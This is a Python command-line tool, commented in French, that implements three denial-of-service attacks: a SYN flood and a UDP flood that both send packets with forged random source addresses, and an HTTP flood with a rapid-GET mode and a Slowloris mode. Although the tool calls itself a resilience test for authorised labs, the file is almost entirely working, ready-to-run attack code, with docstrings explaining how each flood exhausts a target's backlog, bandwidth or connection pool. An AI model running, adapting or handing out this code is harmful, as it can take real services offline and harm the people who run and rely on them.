
import argparse
import random
import socket
import threading
import time
from typing import Dict, Tuple

try:
    from scapy.all import IP, TCP, UDP, send
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


# ---------------------------------------------------------------------------
# 1) SYN flood — la référence pour tester la résilience TCP
# ---------------------------------------------------------------------------
class SynFlood:
    """Inondation de segments SYN avec IP source forgée.

    Mécanisme :
    1. La cible reçoit des SYN avec des IP source inexistantes (forgées).
    2. Elle alloue une entrée dans son backlog TCP et répond SYN-ACK
       vers une IP qui n'existe pas.
    3. Le ACK final n'arrive jamais -> demi-connexion bloquée jusqu'au timeout.
    4. Backlog saturé -> les connexions légitimes sont refusées (refus de service).

    Exemple :
        SynFlood("10.10.14.5", 4444, duration=30.0, threads=8).run()
    """

    def __init__(self, target_ip: str, target_port: int,
                 duration: float = 30.0, threads: int = 8):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self._running = False
        self._sent = 0
        self._errors = 0
        self._lock = threading.Lock()

    @staticmethod
    def _random_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _worker(self) -> None:
        while self._running:
            try:
                pkt = IP(src=self._random_ip(), dst=self.target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=self.target_port,
                    flags="S",
                    seq=random.randint(0, 0xFFFFFFFF),
                )
                send(pkt, verbose=False)
                with self._lock:
                    self._sent += 1
            except Exception:
                with self._lock:
                    self._errors += 1

    def run(self) -> Dict:
        if not SCAPY_OK:
            return {"erreur": "scapy manquant -> pip install scapy dans le venv"}
        self._running = True
        t0 = time.time()
        workers = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.threads)]
        for w in workers:
            w.start()
        while time.time() - t0 < self.duration:
            time.sleep(0.5)
            elapsed = max(time.time() - t0, 0.001)
            print(f"\r[SynFlood] envoyes={self._sent:,} | "
                  f"{self._sent / elapsed:,.0f} pkt/s | erreurs={self._errors}",
                  end="", flush=True)
        self._running = False
        for w in workers:
            w.join(timeout=2)
        elapsed = max(time.time() - t0, 0.001)
        print()
        return {
            "cible": f"{self.target_ip}:{self.target_port}",
            "envoyes": self._sent,
            "erreurs": self._errors,
            "duree_s": round(elapsed, 1),
            "debit_pkt_s": round(self._sent / elapsed),
        }


# ---------------------------------------------------------------------------
# 2) UDP flood — saturer la bande passante / le CPU de la cible
# ---------------------------------------------------------------------------
class UdpFlood:
    """Inondation de datagrammes UDP (ports source aléatoires).

    Idéal contre les services UDP (DNS, NTP, TFTP...) ou pour saturer la
    bande passante d'un lien peu dimensionné.
    """

    def __init__(self, target_ip: str, target_port: int,
                 duration: float = 30.0, threads: int = 8,
                 payload_size: int = 1400):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.payload_size = payload_size
        self._running = False
        self._sent = 0
        self._errors = 0
        self._lock = threading.Lock()

    @staticmethod
    def _random_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def _worker(self) -> None:
        payload = bytes(random.getrandbits(8) for _ in range(self.payload_size))
        while self._running:
            try:
                pkt = IP(src=self._random_ip(), dst=self.target_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=self.target_port,
                ) / payload
                send(pkt, verbose=False)
                with self._lock:
                    self._sent += 1
            except Exception:
                with self._lock:
                    self._errors += 1

    def run(self) -> Dict:
        if not SCAPY_OK:
            return {"erreur": "scapy manquant -> pip install scapy dans le venv"}
        self._running = True
        t0 = time.time()
        workers = [threading.Thread(target=self._worker, daemon=True)
                   for _ in range(self.threads)]
        for w in workers:
            w.start()
        while time.time() - t0 < self.duration:
            time.sleep(0.5)
            elapsed = max(time.time() - t0, 0.001)
            print(f"\r[UdpFlood] envoyes={self._sent:,} | "
                  f"{self._sent / elapsed:,.0f} pkt/s | erreurs={self._errors}",
                  end="", flush=True)
        self._running = False
        for w in workers:
            w.join(timeout=2)
        elapsed = max(time.time() - t0, 0.001)
        print()
        return {
            "cible": f"{self.target_ip}:{self.target_port}",
            "envoyes": self._sent,
            "erreurs": self._errors,
            "duree_s": round(elapsed, 1),
            "debit_pkt_s": round(self._sent / elapsed),
            "volume_mb": round(self._sent * self.payload_size / 1024 / 1024, 1),
        }


# ---------------------------------------------------------------------------
# 3) HTTP flood — épuiser le serveur web (CPU, threads, pool de connexions)
# ---------------------------------------------------------------------------
class HttpFlood:
    """Flood de requêtes HTTP sur une URL cible.

    Deux modes :
      - "get"  : envoie un maximum de requêtes GET (sature workers/CPU).
      - "slow" : Slowloris — ouvre des connexions et ne termine jamais
                 les en-têtes (sature le pool de connexions du serveur).
    """

    def __init__(self, url: str, duration: float = 30.0,
                 threads: int = 20, mode: str = "get"):
        self.url = url
        self.duration = duration
        self.threads = threads
        self.mode = mode.lower()
        self._running = False
        self._sent = 0
        self._errors = 0
        self._lock = threading.Lock()

    def _parse(self) -> Tuple[str, str]:
        reste = self.url.split("//")[-1]
        if "/" in reste:
            host, path = reste.split("/", 1)
            path = "/" + path
        else:
            host, path = reste, "/"
        return host, path

    def _worker_get(self) -> None:
        host, path = self._parse()
        while self._running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, 80))
                s.sendall(
                    f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
                )
                s.close()
                with self._lock:
                    self._sent += 1
            except Exception:
                with self._lock:
                    self._errors += 1

    def _worker_slow(self) -> None:
        s = None
        try:
            host, path = self._parse()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, 80))
            s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
            with self._lock:
                self._sent += 1
            while self._running:
                time.sleep(8)
                try:
                    s.sendall(b"X-a: b\r\n")
                except Exception:
                    break
        except Exception:
            with self._lock:
                self._errors += 1
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

    def run(self) -> Dict:
        self._running = True
        t0 = time.time()
        worker = self._worker_slow if self.mode == "slow" else self._worker_get
        workers = [threading.Thread(target=worker, daemon=True)
                   for _ in range(self.threads)]
        for w in workers:
            w.start()
        while time.time() - t0 < self.duration:
            time.sleep(0.5)
            elapsed = max(time.time() - t0, 0.001)
            print(f"\r[HttpFlood:{self.mode}] requetes={self._sent:,} | "
                  f"{self._sent / elapsed:,.0f} req/s | erreurs={self._errors}",
                  end="", flush=True)
        self._running = False
        for w in workers:
            w.join(timeout=3)
        elapsed = max(time.time() - t0, 0.001)
        print()
        return {
            "cible": self.url,
            "mode": self.mode,
            "requetes": self._sent,
            "erreurs": self._errors,
            "duree_s": round(elapsed, 1),
            "debit_req_s": round(self._sent / elapsed),
        }


# ---------------------------------------------------------------------------
# Interface en ligne de commande
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Tests de résilience réseau (laboratoire autorisé uniquement)")
    parser.add_argument("--type", choices=["syn", "udp", "http"], default="syn",
                        help="Type d'attaque")
    parser.add_argument("--target", required=True, help="IP cible (ex: 10.10.14.5)")
    parser.add_argument("--port", type=int, default=80, help="Port cible")
    parser.add_argument("--url", help="URL cible pour le mode http")
    parser.add_argument("--duration", type=float, default=30.0,
                        help="Durée en secondes")
    parser.add_argument("--threads", type=int, default=8,
                        help="Nombre de threads")
    parser.add_argument("--mode", choices=["get", "slow"], default="get",
                        help="Mode HTTP flood")
    args = parser.parse_args()

    if args.type == "syn":
        result = SynFlood(args.target, args.port, args.duration, args.threads).run()
    elif args.type == "udp":
        result = UdpFlood(args.target, args.port, args.duration, args.threads).run()
    else:
        url = args.url or f"http://{args.target}:{args.port}/"
        result = HttpFlood(url, args.duration, args.threads, args.mode).run()
    print("\nRésultat :", result)


if __name__ == "__main__":
    main()